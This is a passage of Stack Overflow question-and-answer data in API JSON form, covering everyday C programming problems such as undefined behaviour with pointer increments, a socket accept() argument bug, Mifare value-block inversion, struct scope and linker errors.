p++-&gt;i); \n</code></pre>\n\n<hr>\n\n<p>Detail:  the 2nd post-increment of <code>p</code> may occur prior to or may be deferred until after the attempted UB access (with the pre-increment <code>p</code>).  As the increment and access are UB, either one leads to UB.</p>\n"}], "owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 0, "accepted_answer_id": 53748667, "answer_count": 2, "score": 3, "last_activity_date": 1544638201, "creation_date": 1544635777, "question_id": 53748369, "link": "https://stackoverflow.com/questions/53748369/do-the-printf-statements-in-this-example-invoke-undefined-behavior", "title": "Do the printf statements in this example invoke Undefined Behavior?", "body": "<p>Derived from <em><a href=\"https://stackoverflow.com/questions/53747225/p-is-a-pointer-to-a-structure-what-do-all-these-code-snippets-do/53747666#53747666\">this question</a></em>...<br>\nGiven the declaration in line 1 of <code>main</code>, are the second and third <code>printf</code> statements considered undefined behavior because they point to locations not owned by this process?</p>\n\n<pre><code>struct my_structure {\n    int i;\n};\n\nvoid main() {\n    struct my_structure variable = {20};\n    struct my_structure *p = &amp;variable;\n\n    printf(\"NUMBER: %d\\n\", p++-&gt;i);  \n    printf(\"NUMBER: %d\\n\", p++-&gt;i);   \n    printf(\"NUMBER: %d\\n\", p++-&gt;i);   \n}\n</code></pre>\n"}, {"tags": ["c", "sockets", "networking", "signals"], "comments": [{"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1544637103, "post_id": 53748324, "comment_id": 94349892, "body": "Do you get the -1 just after a signal is handled?"}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1544637605, "post_id": 53748324, "comment_id": 94350133, "body": "Also, where do you initialise <code>c</code>? You need to set it to the size of <code>client</code> before you call <code>accept</code>"}, {"owner": {"reputation": 117, "user_id": 4577708, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fd7d480bc5b2d433746be3b11f3b660?s=128&d=identicon&r=PG&f=1", "display_name": "noobcoder24", "link": "https://stackoverflow.com/users/4577708/noobcoder24"}, "reply_to_user": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1544638497, "post_id": 53748324, "comment_id": 94350577, "body": "Yea it happens after the signal is handled. And i guess i don&#39;t initialize &quot;c&quot; anywhere weird. But why would it work if i disable the signal thread. I&#39;ll try initializing it"}, {"owner": {"reputation": 117, "user_id": 4577708, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fd7d480bc5b2d433746be3b11f3b660?s=128&d=identicon&r=PG&f=1", "display_name": "noobcoder24", "link": "https://stackoverflow.com/users/4577708/noobcoder24"}, "reply_to_user": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1544638649, "post_id": 53748324, "comment_id": 94350645, "body": "&amp;c might supposed to be &amp;length: length = sizeof(struct sockaddr_in);"}, {"owner": {"reputation": 117, "user_id": 4577708, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fd7d480bc5b2d433746be3b11f3b660?s=128&d=identicon&r=PG&f=1", "display_name": "noobcoder24", "link": "https://stackoverflow.com/users/4577708/noobcoder24"}, "reply_to_user": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1544639323, "post_id": 53748324, "comment_id": 94350996, "body": "It works now, thank you, i had to change it to &amp;length!!! Really weird how it was working before"}], "answers": [{"tags": [], "owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "is_accepted": true, "score": 0, "last_activity_date": 1544640446, "creation_date": 1544640446, "answer_id": 53749489, "question_id": 53748324, "link": "https://stackoverflow.com/questions/53748324/c-accept-client-socket-invalid-argument-error-when-adding-signal-thread/53749489#53749489", "title": "C Accept Client Socket &quot;Invalid Argument&quot; Error when adding Signal Thread", "body": "<p>You never assign <code>c</code> a sensible value, so you are passing random garbage to <code>accept</code> here:</p>\n\n<pre><code>    newsocket = accept(socket_desc, (struct sockaddr *) &amp;client, (socklen_t *) &amp;c);\n</code></pre>\n\n<p>It may or may not be a legal value. So the effects of this call are going to be unpredictable.</p>\n"}], "owner": {"reputation": 117, "user_id": 4577708, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fd7d480bc5b2d433746be3b11f3b660?s=128&d=identicon&r=PG&f=1", "display_name": "noobcoder24", "link": "https://stackoverflow.com/users/4577708/noobcoder24"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 118, "favorite_count": 0, "accepted_answer_id": 53749489, "answer_count": 1, "score": 0, "last_activity_date": 1544640446, "creation_date": 1544635568, "last_edit_date": 1544639483, "question_id": 53748324, "link": "https://stackoverflow.com/questions/53748324/c-accept-client-socket-invalid-argument-error-when-adding-signal-thread", "title": "C Accept Client Socket &quot;Invalid Argument&quot; Error when adding Signal Thread", "body": "<p>I am doing a project for class and I am stuck on an issue.</p>\n\n<p>My project requires a timer every 15 seconds to print data. It also requires catching termination of the program. To handle both these tasks I created a signal thread and catch SIGINT and SIGALRM (from setitimer) signals. I have no issues here.</p>\n\n<p>However, my server->client connection is now no longer working properly. I keep getting -1 as my socket id with the error being \"Invalid Argument\". This doesn't make any sense to me because if I disable the signal thread everything works fine again. Ill paste the code below.</p>\n\n<pre><code>void * signal_thread(void * arg) {\n\n\nwhile (1) {\n    int caught_signal;\n\n    sigwait(&amp;mask, &amp;caught_signal);\n\n    switch(caught_signal) {\n    case SIGINT:\n        puts(\"Server manually terminated!\");\n        int i;\n        for(i = 0; i&lt;clientCount; i++){\n            send(socketIds[i], \"ServerShutDown\", 255, 0);\n        }\n        break;\n    case SIGALRM:\n        printf(\"CAUGHT SIGALRM\\n\");\n        break;\n    default:\n        break;\n    }\n}\n}\n\nint main(void) {\n    /* do the necessary setup, i.e. bind() and listen()... */\n    int rc;\n    pthread_t signal_tid;\n    sigemptyset(&amp;mask);\n    sigaddset(&amp;mask, SIGINT);\n    sigaddset(&amp;mask, SIGALRM);\n    rc = pthread_sigmask(SIG_BLOCK, &amp;mask, NULL);\n\n    if (rc != 0) \n        puts(\"Sig mask error\");\n\n    rc = pthread_create(&amp;signal_tid, NULL, signal_thread, &amp;mask);\n\n    if (rc!= 0)\n        puts(\"Sig thread error\");\n\n\n\n\n    struct itimerval timer;\n    timer.it_value.tv_sec = 2;\n    timer.it_value.tv_usec = 0;\n    timer.it_interval.tv_sec = 2;\n    timer.it_interval.tv_usec = 0;\n    setitimer (ITIMER_REAL, &amp;timer, NULL);\n\n\nint socket_desc , client_sock , c;\n    struct sockaddr_in server , client;\n     int sockfd, newsocket, length;\n     int port =  8778;\n    //Create socket\n\n    socket_desc = socket(AF_INET , SOCK_STREAM , 0);\n    if (socket_desc == -1)\n    {\n        printf(\"Could not create socket\");\n    }\n\n    if(setsockopt(socket_desc, SOL_SOCKET, SO_REUSEADDR, &amp;(int) {1}, sizeof(int)) &lt; 0){\n        perror(\"setsockopt failed\");\n    }\n\n    bzero((char*) &amp;server, sizeof(server));\n    server.sin_family = AF_INET;\n    server.sin_addr.s_addr = INADDR_ANY;\n    server.sin_port =  htons(port);\n\n    //Bind\n    if( bind(socket_desc,(struct sockaddr *) &amp;server , sizeof(server)) &lt; 0)\n    {\n        //print the error message\n        perror(\"bind failed. Error\");\n        return 1;\n    }\n\n    //Listen\n    listen(socket_desc , 5);\n\n     length = sizeof(struct sockaddr_in);\n\n\n    //Accept and incoming connection\n    puts(\"Waiting for incoming connections...\");\n\n    pthread_t thread_id;\n      while( 1 )\n    {\n        int * socketPtr = malloc(sizeof(int));\n        newsocket = accept(socket_desc, (struct sockaddr *) &amp;client, (socklen_t *) &amp;c);\n        if (newsocket == -1) {\n            perror(\"Error at accept..\");\n        }\n        printf(\"Accepted new client connection!\\n\");\n        socketIds[clientCount++] = newsocket;\n        if( pthread_create( &amp;thread_id , NULL ,  handle_connection , &amp;newsocket) &lt; 0)\n        {\n            perror(\"could not create thread\");\n            return 1;\n        }\n\n\n        //Now join the thread , so that we dont terminate before the thread\n        //pthread_join( thread_id , NULL);\n\n    }\n\n    if (client_sock &lt; 0)\n    {\n        perror(\"accept failed\");\n        return 1;\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>So the error i'm getting occurs here: </p>\n\n<pre><code>if (newsocket == -1) {\n            perror(\"Error at accept..\");\n        }\n</code></pre>\n\n<p>Error at accept..:Invalid argument prints out.</p>\n\n<p>When I disable this line: </p>\n\n<pre><code>rc = pthread_create(&amp;signal_tid, NULL, signal_thread, &amp;mask);\n</code></pre>\n\n<p>The error stops. I am beyond confused how this unrelated thread results in my server client connection being messed up. Any insight would be appreciated</p>\n\n<p>EDIT: Solved ty chris turner. I had the wrong field in the length arg for accept. Weird how it was working before!</p>\n"}, {"tags": ["c", "bit-manipulation", "bit", "mifare"], "comments": [{"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 2, "creation_date": 1544635166, "post_id": 53748199, "comment_id": 94348793, "body": "<code>^ is bitwise XOR, are you looking for </code>~` (bitwise NOT)? Also <code>sprintf</code> writes the number as text."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1544635405, "post_id": 53748199, "comment_id": 94348948, "body": "... and in the <code>sprintf</code> case the buffer will overflow."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1544635630, "post_id": 53748199, "comment_id": 94349093, "body": "<code>sprintf(valuebuffer, &quot;%04x&quot;, 1234567)</code> needs a buffer size of <i>at least</i> 7 to store <i>string</i> <code>&quot;12D687&quot;</code>."}, {"owner": {"reputation": 15221, "user_id": 1023911, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Wln26.jpg?s=128&g=1", "display_name": "Werner Henze", "link": "https://stackoverflow.com/users/1023911/werner-henze"}, "edited": false, "score": 1, "creation_date": 1544635696, "post_id": 53748199, "comment_id": 94349123, "body": "You need to invert the <code>value</code>, not it&#39;s string representation <code>valuebuffer</code>."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1544635761, "post_id": 53748199, "comment_id": 94349160, "body": "Can you just do <code>printf(&quot;%x&quot;, ~((unsigned)value));</code> ?"}, {"owner": {"reputation": 21, "user_id": 5285701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fa96f67cb95f48804e0eb77a1072462?s=128&d=identicon&r=PG&f=1", "display_name": "Ertan K&#252;&#231;&#252;koglu", "link": "https://stackoverflow.com/users/5285701/ertan-k%c3%bc%c3%a7%c3%bckoglu"}, "edited": false, "score": 0, "creation_date": 1544636350, "post_id": 53748199, "comment_id": 94349499, "body": "As I indicated, I just know very basics of C and that leads me to a lot of errors. Thank you all for all your explanations."}], "answers": [{"comments": [{"owner": {"reputation": 797, "user_id": 99124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffb4a98e32eb0337a855061470ea7a19?s=128&d=identicon&r=PG", "display_name": "mlp", "link": "https://stackoverflow.com/users/99124/mlp"}, "edited": false, "score": 0, "creation_date": 1544643792, "post_id": 53748386, "comment_id": 94353240, "body": "If you perform bitwise operations on <code>signed</code> integer types, you&#39;re gonna have a bad time."}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "reply_to_user": {"reputation": 797, "user_id": 99124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffb4a98e32eb0337a855061470ea7a19?s=128&d=identicon&r=PG", "display_name": "mlp", "link": "https://stackoverflow.com/users/99124/mlp"}, "edited": false, "score": 0, "creation_date": 1544694662, "post_id": 53748386, "comment_id": 94370150, "body": "@mlp I&#39;m sure the OP has their reasons for using signed ints"}], "tags": [], "owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "is_accepted": true, "score": 0, "last_activity_date": 1544635840, "last_edit_date": 1592644375, "creation_date": 1544635840, "answer_id": 53748386, "question_id": 53748199, "link": "https://stackoverflow.com/questions/53748199/another-invert-char-array-in-c/53748386#53748386", "title": "Another invert char array in C", "body": "<p>Seems like you're making it more complicated than it needs to be. You can do the binary inversion on the <code>int</code> variable rather than messing around with individual bytes.</p>\n<pre><code>int value = 1234567;\nint inverted= ~ value;\n\nprintf(&quot;%x\\n&quot;,value);\nprintf(&quot;%x\\n&quot;,inverted);\n</code></pre>\n<p>gives you output of</p>\n<blockquote>\n<p>12d687</p>\n<p>ffed2978</p>\n</blockquote>\n"}, {"comments": [{"owner": {"reputation": 797, "user_id": 99124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffb4a98e32eb0337a855061470ea7a19?s=128&d=identicon&r=PG", "display_name": "mlp", "link": "https://stackoverflow.com/users/99124/mlp"}, "edited": false, "score": 0, "creation_date": 1544643744, "post_id": 53748969, "comment_id": 94353216, "body": "Not <i>must</i> but <i>should</i> use the types from <code>&lt;stdint.h&gt;</code>. <code>unsigned char</code> is perfectly usable as a non-negative integer of at least 8 bits, and similarly <code>unsigned long</code> is a non-negative integer of at least 32 bits everywhere."}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 0, "last_activity_date": 1544638254, "creation_date": 1544638254, "answer_id": 53748969, "question_id": 53748199, "link": "https://stackoverflow.com/questions/53748199/another-invert-char-array-in-c/53748969#53748969", "title": "Another invert char array in C", "body": "<p>First of all, you must use the types from stdint.h and not <code>char</code>, because the latter has implementation-defined signedness and is therefore overall unsuitable for holding raw binary data.</p>\n\n<p>With that sorted, you can use a union for maximum flexibility:</p>\n\n<pre><code>#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n\ntypedef union\n{\n  uint32_t u32;\n  uint8_t  u8 [4];\n} uint32_union_t;\n\nint main (void)\n{\n  uint32_union_t x;\n  x.u32 = 1234567;\n\n  for(size_t i=0; i&lt;4; i++)\n  {\n    printf(\"%X \", x.u8[i]);\n  }\n  printf(\"\\n\");\n\n  x.u32 = ~x.u32;\n\n  for(size_t i=0; i&lt;4; i++)\n  {\n    printf(\"%X \", x.u8[i]);\n  }\n  printf(\"\\n\");\n}\n</code></pre>\n\n<p>Notably, the access order of the u8 is endianess dependent. This might be handy when dealing with something like RFID, which doesn't necessarily have the same network endianess as your MCU.</p>\n"}], "owner": {"reputation": 21, "user_id": 5285701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fa96f67cb95f48804e0eb77a1072462?s=128&d=identicon&r=PG&f=1", "display_name": "Ertan K&#252;&#231;&#252;koglu", "link": "https://stackoverflow.com/users/5285701/ertan-k%c3%bc%c3%a7%c3%bckoglu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 692, "favorite_count": 0, "accepted_answer_id": 53748386, "answer_count": 2, "score": -2, "last_activity_date": 1559396383, "creation_date": 1544635086, "last_edit_date": 1559396383, "question_id": 53748199, "link": "https://stackoverflow.com/questions/53748199/another-invert-char-array-in-c", "title": "Another invert char array in C", "body": "<p>That code will run on a payment device (POS). I have to use legacy C (not C# or C++) for that purpose.</p>\n\n<p>I am trying to prepare a simple Mifare card read/write software data. Below document is my reference and I am trying to achieve what is on page 9, 8.6.2.1 Value blocks explains.\n<a href=\"http://www.nxp.com/documents/data_sheet/MF1S50YYX_V1.pdf\" rel=\"nofollow noreferrer\">http://www.nxp.com/documents/data_sheet/MF1S50YYX_V1.pdf</a></p>\n\n<p>I just know very basics of C. All my searches in The Internet have failed. According to document:</p>\n\n<p>1- There is integer variable with value of <code>1234567</code>.</p>\n\n<p>2- There is <code>char array[4]</code> which should have hex of above value which is <code>0x0012D687</code></p>\n\n<p>3- I am supposed to invert that char array[4] and reach value of <code>0xFFED2978</code></p>\n\n<p>I need to do some other things but I have stuck in number 3 above. What I have tried lastly is</p>\n\n<pre><code>int value = 1234567;\nchar valuebuffer[4];\nchar invertbuffer[4];\n\nsprintf(valuebuffer, \"%04x\", value);  \nfor(i = 0;  i &lt; sizeof(valuebuffer);  i++ )\n{   \n    invertbuffer[i] ^= valuebuffer[i];  \n}\n</code></pre>\n\n<p>When I print, I read some other value in <code>invertbuffer</code> and not <code>0xFFED2978</code></p>\n"}, {"tags": ["c", "function", "struct", "declaration"], "comments": [{"owner": {"reputation": 2640, "user_id": 5195699, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f85291bb71f55981b1d412f1efcb7603?s=128&d=identicon&r=PG&f=1", "display_name": "R_Kapp", "link": "https://stackoverflow.com/users/5195699/r-kapp"}, "edited": false, "score": 2, "creation_date": 1544635078, "post_id": 53748161, "comment_id": 94348742, "body": "In the context of <code>setnumber</code> <code>Beta</code> was not defined. The compiler error is correct - I&#39;m not sure what the question is."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1544635080, "post_id": 53748161, "comment_id": 94348743, "body": "<code>Alpha Beta;</code> is known only in <code>main</code>. Even if you also define it in function <code>setnumber</code> it will be a <i>different</i> variable and will cease to exist when <code>setnumber</code> returns."}, {"owner": {"reputation": 23, "user_id": 10686377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2b6bfc7b7e4626481dd54385022dfc74?s=128&d=identicon&r=PG&f=1", "display_name": "FireFuro99", "link": "https://stackoverflow.com/users/10686377/firefuro99"}, "reply_to_user": {"reputation": 2640, "user_id": 5195699, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f85291bb71f55981b1d412f1efcb7603?s=128&d=identicon&r=PG&f=1", "display_name": "R_Kapp", "link": "https://stackoverflow.com/users/5195699/r-kapp"}, "edited": false, "score": 0, "creation_date": 1544635759, "post_id": 53748161, "comment_id": 94349157, "body": "@R_Kapp The question is how to declare it right. Sorry for not writing that in my question, thought it was pretty obvious."}, {"owner": {"reputation": 23, "user_id": 10686377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2b6bfc7b7e4626481dd54385022dfc74?s=128&d=identicon&r=PG&f=1", "display_name": "FireFuro99", "link": "https://stackoverflow.com/users/10686377/firefuro99"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1544635815, "post_id": 53748161, "comment_id": 94349196, "body": "@WeatherVane So how can I do it right, without changing the ordner of typedef, setnumber and main ?"}], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 10686377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2b6bfc7b7e4626481dd54385022dfc74?s=128&d=identicon&r=PG&f=1", "display_name": "FireFuro99", "link": "https://stackoverflow.com/users/10686377/firefuro99"}, "edited": false, "score": 0, "creation_date": 1544636354, "post_id": 53748444, "comment_id": 94349504, "body": "Well that&#39;s not exactly what I was looking for (pre-declarations), but it&#39;s a good way to do it, too. Thank you. Sadly I can&#39;t upvote your answer, because I&#39;m new. I&#39;ll soon give you the green mark instead :)"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 23, "user_id": 10686377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2b6bfc7b7e4626481dd54385022dfc74?s=128&d=identicon&r=PG&f=1", "display_name": "FireFuro99", "link": "https://stackoverflow.com/users/10686377/firefuro99"}, "edited": false, "score": 1, "creation_date": 1544636409, "post_id": 53748444, "comment_id": 94349536, "body": "There is no other way for the function to know anything about <code>Beta</code> apart from accepting either the pointer or the struct istself."}], "tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": true, "score": 3, "last_activity_date": 1544636101, "creation_date": 1544636101, "answer_id": 53748444, "question_id": 53748161, "link": "https://stackoverflow.com/questions/53748161/a-function-which-contains-a-struct-that-is-declared-in-the-following-function/53748444#53748444", "title": "A function, which contains a struct, that is declared in the following function?", "body": "<p>You can do it like this, where <code>main</code> passes the address of <code>Beta</code> to the function.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\ntypedef struct Alpha {\n    int number;\n} Alpha;\n\nvoid setnumber(Alpha *Beta) {\n    Beta-&gt;number = 42;\n}\n\nint main(void) {\n    Alpha Beta = {0};\n    setnumber(&amp;Beta);\n    printf(\"%d\\n\", Beta.number);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 10686377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2b6bfc7b7e4626481dd54385022dfc74?s=128&d=identicon&r=PG&f=1", "display_name": "FireFuro99", "link": "https://stackoverflow.com/users/10686377/firefuro99"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 27, "favorite_count": 0, "closed_date": 1544643718, "accepted_answer_id": 53748444, "answer_count": 1, "score": -2, "last_activity_date": 1544636101, "creation_date": 1544634947, "last_edit_date": 1544635843, "question_id": 53748161, "link": "https://stackoverflow.com/questions/53748161/a-function-which-contains-a-struct-that-is-declared-in-the-following-function", "closed_reason": "Not suitable for this site", "title": "A function, which contains a struct, that is declared in the following function?", "body": "<p>The follow is my Code: </p>\n\n<pre><code>typedef struct Alpha {\nint number;\n} Alpha;\n\nvoid setnumber(){\n    Beta-&gt;number = 1;\n}\n\n\nint main()\n{\n    Alpha Beta;\n    setnumber();\n    return 0;\n}\n</code></pre>\n\n<p>This just outputs \"Error: Beta was not declared in this scope\"</p>\n\n<p>How to I declare this, so it works? (without changing the order of typedef, setnumber and main) (Can i pre-declare somethign somehow, If yes, then what and how?)</p>\n"}, {"tags": ["c", "codeblocks", "undefined-reference", "gurobi"], "owner": {"reputation": 93, "user_id": 6903605, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qpn1z.jpg?s=128&g=1", "display_name": "volkang", "link": "https://stackoverflow.com/users/6903605/volkang"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 178, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1544634839, "creation_date": 1544634839, "question_id": 53748132, "link": "https://stackoverflow.com/questions/53748132/undefined-reference-while-calling-gurobi-in-c-codeblocks", "title": "Undefined reference while calling GUROBI in C, Codeblocks", "body": "<p>I downloaded Codeblocks to call GUROBI - an optimization package with libraries- from C. While building the example C code from GUROBI (<a href=\"https://www.gurobi.com/documentation/8.1/examples/mip1_c_c.html\" rel=\"nofollow noreferrer\">See  here</a>), I get 15 errors in the form of:</p>\n\n<pre><code>.../main.c:32: undefined reference to `GRBloadenv@8'\n.../main.c:32: undefined reference to `GRBreadmodel@12'\n</code></pre>\n\n<p>I already did the following:</p>\n\n<ol>\n<li><p>In global compiler settings</p>\n\n<ul>\n<li>Set <em>Settings>Compiler>Search Directories>Compiler</em> path to GUROBI's include folder (with .h files)</li>\n<li>Set <em>Search Directories>Linker</em> path to GUROBI's lib folder (with .lib files)</li>\n<li>Link libraries from Linker settings.</li>\n</ul></li>\n<li><p>Did the same three steps above for the prject itself, i.e. <em>Project>Build Options>...[same as Step 1]</em> </p></li>\n</ol>\n\n<p>Having spent the whole day, i cant find any solution. Any help is highly appreciated. </p>\n\n<p>I'm working on Windows 10, Code::Blocks 17.12, and Gurobi 8.1.0</p>\n\n<p><a href=\"https://i.stack.imgur.com/Elqgv.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Elqgv.png\" alt=\"Global compiler path to .h files\"></a>\n<a href=\"https://i.stack.imgur.com/RoDBh.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/RoDBh.png\" alt=\"enter image description here\"></a>\n<a href=\"https://i.stack.imgur.com/movm9.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/movm9.png\" alt=\"enter image description here\"></a></p>\n"}, {"tags": ["c", "kernel"], "comments": [{"owner": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "edited": false, "score": 1, "creation_date": 1544648846, "post_id": 53748112, "comment_id": 94355368, "body": "In newer kernels the macro <code>for_each_process</code> is defined in <a href=\"https://elixir.bootlin.com/linux/v4.19.8/source/include/linux/sched/signal.h#L543\" rel=\"nofollow noreferrer\">include/linux/sched/signal.h</a>. Probably, you need to <code>#include &lt;linux&#47;sched&#47;signal.h&gt;</code> for use that macro. BTW, unless you perfectly know what the error message means, it is better to cite it <b>exactly</b>, without rewording. In most cases, an original error message contains sufficient information about &quot;what is going wrong&quot;."}, {"owner": {"reputation": 17, "user_id": 10724880, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6208cdea8796dd86c1765ab75be2747f?s=128&d=identicon&r=PG&f=1", "display_name": "benjamintanklin", "link": "https://stackoverflow.com/users/10724880/benjamintanklin"}, "reply_to_user": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "edited": false, "score": 0, "creation_date": 1544732039, "post_id": 53748112, "comment_id": 94390622, "body": "thank you, this was my issue"}], "owner": {"reputation": 17, "user_id": 10724880, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6208cdea8796dd86c1765ab75be2747f?s=128&d=identicon&r=PG&f=1", "display_name": "benjamintanklin", "link": "https://stackoverflow.com/users/10724880/benjamintanklin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 468, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1617861650, "creation_date": 1544634780, "last_edit_date": 1617861650, "question_id": 53748112, "link": "https://stackoverflow.com/questions/53748112/kernel-module-compilation-error-of-macro-for-each-process", "title": "kernel module compilation error of macro for_each_process", "body": "<p>I am trying to compile a 